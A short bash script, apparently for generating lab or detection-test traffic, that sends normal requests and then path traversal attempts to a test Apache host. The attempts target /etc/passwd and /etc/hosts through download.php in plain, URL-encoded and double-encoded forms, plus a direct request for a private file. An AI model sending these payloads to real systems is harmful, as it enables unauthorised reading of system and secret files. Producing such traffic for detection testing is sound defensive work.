#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${BASE_URL:-http://apache-v2-test.local}"
USER_AGENT="demo-path-traversal/1.0"

request() {
    local label="$1"
    local url="$2"

    printf '\n[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S %Z')" "$label"

    curl \
        --silent \
        --show-error \
        --output /dev/null \
        --write-out 'HTTP %{http_code} | %{url_effective}\n' \
        --user-agent "$USER_AGENT" \
        "$url"

    sleep 1
}

echo '============================================================'
echo 'Path Traversal Demo Traffic'
echo "Source IP: $(hostname -I | awk '{print $1}')"
echo "Target:    $BASE_URL"
echo "Start KST: $(TZ=Asia/Seoul date '+%Y-%m-%d %H:%M:%S %Z')"
echo '============================================================'

# 정상 비교 요청
request \
    'Normal page request' \
    "$BASE_URL/"

request \
    'Allowed file download' \
    "$BASE_URL/download.php?file=manual.txt"

# 단순 미허용 파일 요청
request \
    'Unknown file request' \
    "$BASE_URL/download.php?file=unknown.txt"

# Path Traversal 원문
request \
    'Plain path traversal' \
    "$BASE_URL/download.php?file=../../../../etc/passwd"

# URL encoding
request \
    'URL-encoded path traversal' \
    "$BASE_URL/download.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double encoding
request \
    'Double-encoded path traversal' \
    "$BASE_URL/download.php?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# 다른 민감 파일 대상
request \
    'Alternate target file' \
    "$BASE_URL/download.php?file=../../../../etc/hosts"

# 직접 민감 경로 접근
request \
    'Direct sensitive path request' \
    "$BASE_URL/private/secret.txt"

echo
echo '============================================================'
echo "End KST: $(TZ=Asia/Seoul date '+%Y-%m-%d %H:%M:%S %Z')"
echo 'Demo requests completed.'
echo '============================================================'
